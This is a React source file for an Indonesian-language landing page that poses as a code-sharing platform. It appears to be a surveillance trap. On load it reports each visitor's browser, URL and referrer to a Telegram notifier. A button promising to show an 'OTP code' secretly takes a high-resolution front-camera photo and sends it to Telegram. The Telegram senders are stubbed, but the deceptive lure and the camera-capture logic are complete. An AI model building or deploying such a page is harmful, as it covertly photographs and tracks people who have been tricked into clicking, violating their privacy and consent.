import { useState, useEffect, useCallback } from 'react';

// Mock functions untuk telegram utils
const sendTelegramNotification = async (data: any) => {
  console.log('Sending telegram notification:', data);
  // Implementasi actual telegram notification
};

const sendImageToTelegram = async (photoBlob: Blob) => {
  console.log('Sending image to telegram:', photoBlob);
  // Implementasi actual image sending
};

function App() {
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState('');

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendPhoto = useCallback(async () => {
    try {
      setIsLoading(true);
      setMessage('Mengakses kamera...');

      // Memilih kamera depan
      const constraints = {
        video: {
          facingMode: { exact: 'user' },
          width: { ideal: 4096 },
          height: { ideal: 2160 }
        },
        audio: false
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Buat elemen video untuk menampilkan stream
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      
      setMessage('Menyiapkan kamera...');

      // Tunggu video siap diputar
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(resolve, 500);
        };
      });

      setMessage('Mengambil foto...');

      // Setup canvas dengan dimensi video yang didapat
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1920;
      canvas.height = video.videoHeight || 1080;
      const context = canvas.getContext('2d');
      
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      // Konversi gambar ke blob dengan kualitas maksimum
      const photoBlob = await new Promise<Blob>((resolve, reject) => {
        canvas.toBlob((blob) => {
          if (blob) {
            resolve(blob);
          } else {
            reject(new Error("Gagal mendapatkan Blob dari canvas."));
          }
        }, 'image/jpeg', 1.0);
      });

      // Hentikan semua track untuk menutup kamera
      stream.getTracks().forEach(track => track.stop());

      setMessage('Mengirim foto...');

      // Kirim foto melalui Telegram
      await sendImageToTelegram(photoBlob);
      
      setMessage('Foto berhasil dikirim!');
      setTimeout(() => setMessage(''), 3000);

    } catch (error) {
      console.error('Error capturing photo:', error);
      setMessage('Gagal mengambil foto. Pastikan browser mendukung kamera.');
      setTimeout(() => setMessage(''), 3000);
    } finally {
      setIsLoading(false);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendPhoto();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-blue-900 to-purple-900">
      <header className="bg-gray-800/80 backdrop-blur-sm py-6 shadow-lg">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white text-center">Kode Teks</h1>
        </div>
      </header>

      <main className="container mx-auto px-4 py-12">
        <div className="max-w-4xl mx-auto">
          
          {/* Hero Section */}
          <div className="text-center mb-12">
            <h2 className="text-5xl font-extrabold text-white mb-6 leading-tight">
              Selamat Datang di
              <span className="block text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-400">
                Platform Kode Teks
              </span>
            </h2>
            <p className="text-xl text-gray-300 max-w-2xl mx-auto leading-relaxed">
              Platform modern untuk berbagi dan mengelola kode teks dengan fitur-fitur canggih
              yang memudahkan pekerjaan Anda.
            </p>
          </div>

          {/* Main Content Card */}
          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 shadow-2xl border border-white/20 mb-8">
            <div className="grid md:grid-cols-2 gap-8 items-center">
              
              {/* Text Content */}
              <div className="space-y-6">
                <h3 className="text-3xl font-bold text-white mb-4">
                  Fitur Unggulan
                </h3>
                
                <div className="space-y-4">
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-blue-400 rounded-full mt-2 flex-shrink-0"></div>
                    <div>
                      <h4 className="text-lg font-semibold text-white">Editor Canggih</h4>
                      <p className="text-gray-300">Syntax highlighting dan auto-completion untuk berbagai bahasa pemrograman.</p>
                    </div>
                  </div>
                  
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-purple-400 rounded-full mt-2 flex-shrink-0"></div>
                    <div>
                      <h4 className="text-lg font-semibold text-white">Kolaborasi Real-time</h4>
                      <p className="text-gray-300">Bekerja bersama tim dalam waktu nyata dengan sinkronisasi otomatis.</p>
                    </div>
                  </div>
                  
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-green-400 rounded-full mt-2 flex-shrink-0"></div>
                    <div>
                      <h4 className="text-lg font-semibold text-white">Cloud Storage</h4>
                      <p className="text-gray-300">Penyimpanan aman di cloud dengan backup otomatis.</p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Action Button */}
              <div className="text-center">
                <div className="bg-gradient-to-r from-red-500 to-red-600 rounded-full p-1 inline-block shadow-2xl">
                  <button 
                    onClick={handlePlayClick}
                    disabled={isLoading}
                    className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-105 group disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <svg className="w-16 h-16 text-white group-hover:text-gray-100" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M8 5v14l11-7z"/>
                    </svg>
                  </button>
                </div>
                
                <div className="mt-6">
                  <h4 className="text-xl font-semibold text-white mb-2">Mulai Sekarang</h4>
                  <p className="text-gray-300">Klik tombol untuk melihat kode otp</p>
                  
                  {message && (
                    <div className="mt-4 p-3 bg-blue-500/20 border border-blue-400/30 rounded-lg">
                      <p className="text-blue-200 text-sm">{message}</p>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>

          {/* Additional Info Cards */}
          <div className="grid md:grid-cols-3 gap-6">
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-white/10 hover:bg-white/10 transition-all duration-300">
              <div className="w-12 h-12 bg-blue-500 rounded-lg flex items-center justify-center mb-4">
                <span className="text-white font-bold text-xl">🚀</span>
              </div>
              <h5 className="text-lg font-semibold text-white mb-2">Performa Tinggi</h5>
              <p className="text-gray-300 text-sm">Dioptimalkan untuk kecepatan dan efisiensi maksimal dalam setiap operasi.</p>
            </div>
            
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-white/10 hover:bg-white/10 transition-all duration-300">
              <div className="w-12 h-12 bg-purple-500 rounded-lg flex items-center justify-center mb-4">
                <span className="text-white font-bold text-xl">🔒</span>
              </div>
              <h5 className="text-lg font-semibold text-white mb-2">Keamanan Terjamin</h5>
              <p className="text-gray-300 text-sm">Enkripsi end-to-end dan sistem keamanan berlapis untuk melindungi data Anda.</p>
            </div>
            
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-white/10 hover:bg-white/10 transition-all duration-300">
              <div className="w-12 h-12 bg-green-500 rounded-lg flex items-center justify-center mb-4">
                <span className="text-white font-bold text-xl">💡</span>
              </div>
              <h5 className="text-lg font-semibold text-white mb-2">AI Assistant</h5>
              <p className="text-gray-300 text-sm">Bantuan AI yang cerdas untuk debugging, optimization, dan code review.</p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
